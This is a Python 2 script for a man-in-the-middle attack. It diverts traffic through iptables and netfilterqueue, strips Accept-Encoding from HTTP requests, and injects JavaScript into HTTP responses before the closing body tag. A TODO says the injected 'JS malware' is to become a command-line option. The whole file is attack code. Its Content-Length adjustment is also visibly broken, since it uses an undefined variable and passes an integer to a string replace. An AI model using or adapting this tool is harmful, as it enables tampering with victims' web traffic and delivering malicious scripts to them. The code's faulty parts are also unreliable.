#!/usr/bin/env python

import netfilterqueue
import scapy.all as sc
import subprocess
import argparse
import re

#Accept-Encoding: gzip, deflate in http request spits outs '\xff\x00\xff\xff\xff\x00\xff\xff\xff' raw data
#we'll use regex to modify zipped html content
#Accept-Encoding:.*?\\r\\n //matches up to carriage return and first newline
#js alert--> <script>alert('test');</script></body>
#will always be a  </body> in the page source, shoud always be able to use as a hook for code injection
#have to run python2 for this script
#TODO --------------------------------------------------------
#add arg parsing for JS malware, iptable config 


def iptable_conf():
    pipecmd_lm = 'iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001'
    pipecmd_rh = 'iptables -I FORWARD -j NFQUEUE --queue-num 1001'
    input_checker = False
    while input_checker == False:
        input1 = raw_input('Enter \'L\' to capture web traffic from a local machine or \'R\' for a remote machine\n:')
        if input1 == 'L':
            print("Local host chosen")
            input_checker = True
            return subprocess.check_output(pipecmd_lm,shell=True)
        if input1 == 'R':
            print("Remote host chosen")
            input_checker = True
            return subprocess.check_output(pipecmd_rh,shell=True)


def set_load(rpkt,load):
    rpkt[sc.Raw].load = load
    del rpkt[sc.IP].len    
    del rpkt[sc.IP].chksum
    del rpkt[sc.TCP].chksum
    return rpkt


def process_packet(pkt):
    injection_script = ("<script>alert('hacked!!!');</script>") # I want to make this an argparse option, pass JS into command line 
    sc_pkt = sc.IP(pkt.get_payload())
    if sc_pkt.haslayer(sc.TCP):
        if sc_pkt.haslayer(sc.Raw):
            load = sc_pkt[sc.Raw].load
            if sc_pkt[sc.TCP].dport == 80:
                print('[+] HTTP Request')
                load = re.sub("Accept-Encoding:.*?\\r\\n",'',load) #replaces with null string, use our function set_load to modify load 
                
            elif sc_pkt[sc.TCP].sport == 80:
                print('[+] HTTP Response')
                load = load.replace("</body>",injection_script + "</body>")
                content_length_search = re.search(r'(?:Content-Length:\s)(\d*)', response_load)
                
                if content_length_search:
                    content_length = content_length_search.group(1) #returning second group which is the actual content length number
                    new_content_length = int(content_length) + len(injection_script) #adding length of chars in injection string 
                    response_load = response_load.replace(content_length,new_content_length)
            
            if load != sc_pkt[sc.Raw].load:
                new_sc_pkt = set_load(sc_pkt,load)
                pkt.set_payload(str(new_sc_pkt))



    pkt.accept()


try:
    iptable_conf()
    
    print("iptables configured\n\n")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1001, process_packet)
    queue.run()
    
    
except KeyboardInterrupt:
    subprocess.check_output('iptables -F',shell=True)
    print('\nIPtables flushed')
